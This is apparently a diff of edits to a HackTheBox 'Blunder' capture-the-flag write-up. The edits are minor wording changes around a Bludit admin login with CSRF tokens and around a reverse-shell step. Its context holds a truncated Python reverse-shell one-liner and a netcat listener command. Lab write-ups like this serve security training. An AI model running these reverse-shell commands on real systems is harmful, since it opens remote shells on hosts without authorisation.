@@ -52,7 +52,7 @@ We can find a login page at `/admin`. Where we can try some basic SQLi attack al
 
 Here, we don't find any useful hint but can see that this login page uses [CSRF Token](https://portswigger.net/web-security/csrf/tokens) which are used as method to avoid login bruteforce attacks. With every new request a new token is generated and this needs to be submitted along with login credentials while performing a login. So, if we plan to bruteforce the credentials we need to figure out a method that along with the changing credentials we are sending the correct CRSF token with every login attempt else we won't be able to find the correct login credentials.
 
-### InitialFoothold
+### Initial Foothold
 
 From the login page, we get one hint and that is the term `BLUDIT`. We can try to look for it on google to see if it some known service and even try to look for some associated vulnerability.
 
@@ -255,7 +255,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 We can now start another listener on port 443 using the command `nc -nvlp 443` and run the above command with our attacking machine's IP address on the target machine:
 
-On target machine:
+On target machine's previously obtained shell:
 
 ```
 ┌─[tester@parrot-virtual]─[~/Desktop/GitHub/Writeups/HackTheBox/Easy/blunder]
